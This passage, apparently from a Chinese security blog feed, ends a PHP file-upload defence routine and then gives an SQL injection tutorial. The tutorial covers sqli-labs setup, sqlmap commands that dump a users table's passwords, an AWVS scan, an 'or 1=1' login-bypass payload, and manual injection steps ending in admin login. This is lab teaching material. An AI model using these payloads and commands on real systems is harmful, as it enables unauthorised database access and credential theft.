&#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (substr(strrchr($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>) != <span class=\"string\">&#x27;jpg&#x27;</span>) &#123;</span><br><span class=\"line\"><span class=\"meta\">                @unlink(<span class=\"params\">$filename</span>);</span></span><br><span class=\"line\">                exit(function_exists(<span class=\"string\">&#x27;iconv&#x27;</span>) ? iconv(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件格式校验不正确&#x27;</span>) : <span class=\"string\">&#x27;The document format verification is not correct&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>6. 正确的防御方法：<br>\n把压缩包放进 tmp 目录里，如果上传、解压缩的操作都能在 tmp 目录里完成，再把我们需要的头像文件拷贝到 web 目录中</p>\n<p>7. 附上最后一版的防御代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 大众版头像上传处理 2014-6-15</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;环境不支持&#x27;</span>) : <span class=\"string\">&#x27;The php does not support&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 创建图片存储文件夹</span></span><br><span class=\"line\">        <span class=\"variable\">$dir</span> = FCPATH.<span class=\"string\">&#x27;member/uploadfile/member/&#x27;</span>.<span class=\"variable language_\">$this</span>-&gt;uid.<span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$dir</span>)) &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$dir</span>, <span class=\"number\">0777</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;avatar.zip&#x27;</span>; <span class=\"comment\">// 存储flashpost图片</span></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$filename</span>, <span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&#x27;HTTP_RAW_POST_DATA&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"comment\">// 解压缩文件</span></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">library</span>(<span class=\"string\">&#x27;Pclzip&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">PclFile</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"variable\">$content</span> = <span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">listContent</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable\">$content</span>) &#123;</span><br><span class=\"line\">            @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件已损坏&#x27;</span>) : <span class=\"string\">&#x27;The file has damaged&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 验证文件</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$content</span> <span class=\"keyword\">as</span> <span class=\"variable\">$t</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== <span class=\"literal\">FALSE</span>) &#123;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;非法名称的文件&#x27;</span>) : <span class=\"string\">&#x27;llegal name file&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>) != <span class=\"string\">&#x27;jpg&#x27;</span>) &#123;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件格式校验不正确&#x27;</span>) : <span class=\"string\">&#x27;The document format verification is not correct&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 解压文件</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">extract</span>(PCLZIP_OPT_PATH, <span class=\"variable\">$dir</span>, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            @<span class=\"title function_ invoke__\">dr_dir_delete</span>(<span class=\"variable\">$dir</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">zip</span>(<span class=\"literal\">true</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_file</span>(<span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;45x45.jpg&#x27;</span>) || !<span class=\"title function_ invoke__\">is_file</span>(<span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;90x90.jpg&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;文件创建失败&#x27;</span>);</span><br><span class=\"line\">        &#125;  </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "File upload"
            ]
        },
        {
            "id": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL injection",
            "date_published": "2022-03-16T05:38:45.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h3 id=\"1sqli-labs-master-安装\"><a class=\"markdownIt-Anchor\" href=\"#1sqli-labs-master-安装\">#</a> 1.sqli-labs-master 安装</h3>\n<p>下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板</p>\n<h4 id=\"1将sqli-labs-master移动到网站根目录下解压\"><a class=\"markdownIt-Anchor\" href=\"#1将sqli-labs-master移动到网站根目录下解压\">#</a> 1. 将 sqli-labs-master 移动到网站根目录下，解压</h4>\n<p><code>unzip sqli-labs-master</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png\" alt=\"img\"></p>\n<h4 id=\"2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\"><a class=\"markdownIt-Anchor\" href=\"#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\">#</a> 2. 修改配置文件，配合文件为： <code>sqli/sql-connections/db-creds.inc</code></h4>\n<p><code>vim sqli/sql-connections/db-creds.inc</code></p>\n<p>数据库用户名和密码在宝塔面板中可以修改</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png\" alt=\"img\"></p>\n<h4 id=\"3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\"><a class=\"markdownIt-Anchor\" href=\"#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\">#</a> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png\" alt=\"img\"></p>\n<h4 id=\"4验证安装完成后即可按到如下界面\"><a class=\"markdownIt-Anchor\" href=\"#4验证安装完成后即可按到如下界面\">#</a> 4. 验证安装完成后，即可按到如下界面</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png\" alt=\"img\"></p>\n<h3 id=\"2sqlmap-安装与使用\"><a class=\"markdownIt-Anchor\" href=\"#2sqlmap-安装与使用\">#</a> 2.sqlmap 安装与使用</h3>\n<h4 id=\"1kali联网\"><a class=\"markdownIt-Anchor\" href=\"#1kali联网\">#</a> 1.kali 联网</h4>\n<p>选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中</p>\n<p>如果不能联网，修改 <code>/etc/network/interfaces</code>   ，设置 ip，网关，掩码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> /etc/network/interfaces.d/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface**</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">address 192.168.0.66</span><br><span class=\"line\">gateway 192.168.1.1</span><br><span class=\"line\">netmask 255.255.254.0</span><br></pre></td></tr></table></figure>\n<h4 id=\"2修改dns-etcresolvconf\"><a class=\"markdownIt-Anchor\" href=\"#2修改dns-etcresolvconf\">#</a> 2. 修改 DNS，  <code>/etc/resolv.conf</code></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">nameserver 114.114.114.114</span><br><span class=\"line\">search localdomain</span><br></pre></td></tr></table></figure>\n<h4 id=\"3重启网络服务\"><a class=\"markdownIt-Anchor\" href=\"#3重启网络服务\">#</a> 3. 重启网络服务</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/networking restart</span><br><span class=\"line\"></span><br><span class=\"line\">service networking restart </span><br></pre></td></tr></table></figure>\n<h4 id=\"4sqlmap使用\"><a class=\"markdownIt-Anchor\" href=\"#4sqlmap使用\">#</a> 4.sqlmap 使用</h4>\n<p>下载：Github：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">https://github.com/sqlmapproject/sqlmap</span></p>\n<h4 id=\"5sqlmap支持的注入技术\"><a class=\"markdownIt-Anchor\" href=\"#5sqlmap支持的注入技术\">#</a> 5.SQLMAP 支持的注入技术</h4>\n<p>​\t基于布尔的盲注：根据返回页面判断条件真假的注入。</p>\n<p>​\t基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。</p>\n<p>​\t基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<p>​\t基于联合查询的注入：可以使用 UNION 的情况下的注入。</p>\n<p>​\t堆查询注入：同时执行多条语句的注入。</p>\n<h4 id=\"6sqlmap支持的数据库类型\"><a class=\"markdownIt-Anchor\" href=\"#6sqlmap支持的数据库类型\">#</a> 6.SQLMAP 支持的数据库类型</h4>\n<p>​\t主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等</p>\n<h4 id=\"7sqlmap用法以下用windows演示\"><a class=\"markdownIt-Anchor\" href=\"#7sqlmap用法以下用windows演示\">#</a> 7.sqlmap 用法 (以下用 Windows 演示)</h4>\n<h4 id=\"71对于get请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#71对于get请求爆破方式\">#</a> 7.1 对于 get 请求爆破方式</h4>\n<p>1.sqlmap -u URL</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span></p>\n<p>判断可注入的参数</p>\n<p>判断可以用哪种 SQL 注入技术来注入</p>\n<p>识别出所有存在的注入类型</p>\n<p>尝试去判定数据库版本、开发语言、操作系统版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png\" alt=\"image-20220213182954882\"></p>\n<p>2.sqlmap -u URL --current-db 获得数据库名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> --current-db</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png\" alt=\"image-20220213183117274\"></p>\n<p>3.sqlmap -u URL -D database --tables  获得数据库中表名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security --tables</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png\" alt=\"image-20220213183308240\"></p>\n<p>4.sqlmap -u URL -D database -T tables --columns 获得表中字段名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users --columns</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png\" alt=\"image-20220213183454058\"></p>\n<p>5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users -C password,username --dump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png\" alt=\"image-20220213183651064\"></p>\n<h4 id=\"72对于post请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#72对于post请求爆破方式\">#</a> 7.2 对于 post 请求爆破方式</h4>\n<p>1. 保存文件方式  sqlmap -r x.txt</p>\n<p>先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -r E:\\1.txt</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png\" alt=\"image-20220213183936861\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png\" alt=\"image-20220213184622656\"></p>\n<p>2. 手动输入 post 参数方式  sqlmap -u URL --data “”</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --data “uname=admin&amp;passwd=admin&amp;submit=Submit” --current-db</p>\n<p>3. 自动搜索 post 参数方式</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --forms</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png\" alt=\"image-20220213185639194\"></p>\n<h4 id=\"73对于一些较难注入的场景\"><a class=\"markdownIt-Anchor\" href=\"#73对于一些较难注入的场景\">#</a> 7.3 对于一些较难注入的场景</h4>\n<p>通过指定 level 设置，一共包含五个等级</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> level 5</p>\n<h3 id=\"使用awvs-进行sql-inject扫描\"><a class=\"markdownIt-Anchor\" href=\"#使用awvs-进行sql-inject扫描\">#</a> 使用 AWVS 进行 sql inject 扫描</h3>\n<p>安装过程不在描述，使用 add target 输入要扫描的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png\" alt=\"image-20220305141924499\"></p>\n<p>选择扫描速度</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png\" alt=\"image-20220305142112656\"></p>\n<p>设置 user-agent 伪装</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png\" alt=\"image-20220305142142802\"></p>\n<p>可以联动被动扫描器如 xray 进行多次扫描，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png\" alt=\"image-20220305142228843\"></p>\n<p>选择 scan</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png\" alt=\"image-20220305142305286\"></p>\n<p>发现 sql 注入，存在盲注</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png\" alt=\"image-20220305142353893\"></p>\n<p>点击可以查看详细信息和扫描过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png\" alt=\"image-20220305142445896\"></p>\n<h3 id=\"3sql注入基础\"><a class=\"markdownIt-Anchor\" href=\"#3sql注入基础\">#</a> 3.SQL 注入基础</h3>\n<h4 id=\"31sql前置知识\"><a class=\"markdownIt-Anchor\" href=\"#31sql前置知识\">#</a> 3.1SQL 前置知识</h4>\n<p>1.mysql 查询方式</p>\n<p>mysql 注入主要关注 MYSQL 系统数据库 <code>information_schema</code> ，关注系统数据库的表 <code>columns</code>  和 <code>schemata</code>  表以及 <code>tables</code>  表</p>\n<p><code>SCHEMATA</code>  表：提供了关于数据库的信息</p>\n<p>desc information_schema.schemata;</p>\n<p>select distinct schema_name from schemata;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png\" alt=\"image-20220213191251636\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png\" alt=\"image-20220213191345456\"></p>\n<p><code>COLUMNS</code>  表：给出了表中的列信息</p>\n<p>desc information_schema.columns;</p>\n<p>select distinct column_name from information_schema.columns</p>\n<p><code>TABLES</code>  表：给出了关于数据库中的表的信息</p>\n<p>desc information_schema.tables;</p>\n<p>select distinct table_name from information_schema.tables;</p>\n<p><strong>即可以使用的查询语句为</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)</span><br><span class=\"line\"></span><br><span class=\"line\">2.select table_name from information_schema.tables where table_schema=&#x27;security&#x27;; 获取表名</span><br><span class=\"line\"></span><br><span class=\"line\">3.select column_name  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;;  获取列名</span><br><span class=\"line\"></span><br><span class=\"line\">4.select username from users;  获取数据</span><br></pre></td></tr></table></figure>\n<p>2.mysql 函数</p>\n<p>常用的 mysql 函数有：</p>\n<p><code>user()</code>  用户名</p>\n<p><code>database()</code>  数据库名</p>\n<p><code>version()</code>  mysql 数据库版本</p>\n<p><code>load_file()</code>  mysql 读取本地文件的函数</p>\n<p><code>@@datadir</code>   数据库路径</p>\n<p>3.sql 常用注释</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png\" alt=\"image-20220213193633629\"></p>\n<h4 id=\"32sql注入定义\"><a class=\"markdownIt-Anchor\" href=\"#32sql注入定义\">#</a> 3.2SQL 注入定义</h4>\n<p>SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>本质因为输入的数据和代码不进行区分</p>\n<p>成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。</p>\n<p>所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入</p>\n<p>常见的包括：</p>\n<p>Get 参数触发 SQL 注入</p>\n<p>POST 参数触发 SQL 注入</p>\n<p>Cookie 触发 SQL 注入</p>\n<p>其他参与 sql 执行的输入都有可能进行 SQL 注入</p>\n<p>两个条件</p>\n<p>用户能够控制输入</p>\n<p>原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据</p>\n<h4 id=\"32mysql注入分类\"><a class=\"markdownIt-Anchor\" href=\"#32mysql注入分类\">#</a> 3.2mysql 注入分类</h4>\n<p>1. 按照请求方法注入</p>\n<p>​\tget 型注入</p>\n<p>​\tpost 型注入</p>\n<p>2. 按照 SQL 数据类型分类</p>\n<p>​\t整形注入</p>\n<p>​\t字符型注入</p>\n<p>3. 其他类型数据类型</p>\n<p>​\t报错注入</p>\n<p>​\t双注入</p>\n<p>​\t布尔盲注</p>\n<p>​\t时间盲注</p>\n<p>​\tCookie 注入</p>\n<p>​\tUser-Agent 注入</p>\n<p><strong>手工注入过程</strong></p>\n<p>1 判断是否存在注入点；</p>\n<p>2 判断字段长度（字段数）；</p>\n<p>3 判断字段回显位置；</p>\n<p>4 判断数据库信息；</p>\n<p>5 查找数据库名；</p>\n<p>6 查找数据库表；</p>\n<p>7 查找数据库表中所有字段以及字段值；</p>\n<p>8 猜解账号密码；</p>\n<p>9 登录管理员后台。</p>\n<h5 id=\"万能密码\"><a class=\"markdownIt-Anchor\" href=\"#万能密码\">#</a> 万能密码</h5>\n<p>select * from users where  username=&quot;&quot; or 1=1 --+</p>\n<p>通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;</p>\n<h5 id=\"整形注入\"><a class=\"markdownIt-Anchor\" href=\"#整形注入\">#</a> 整形注入</h5>\n<p>1. 判断是否由注入 (是否未严格校验)— 第一要素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span 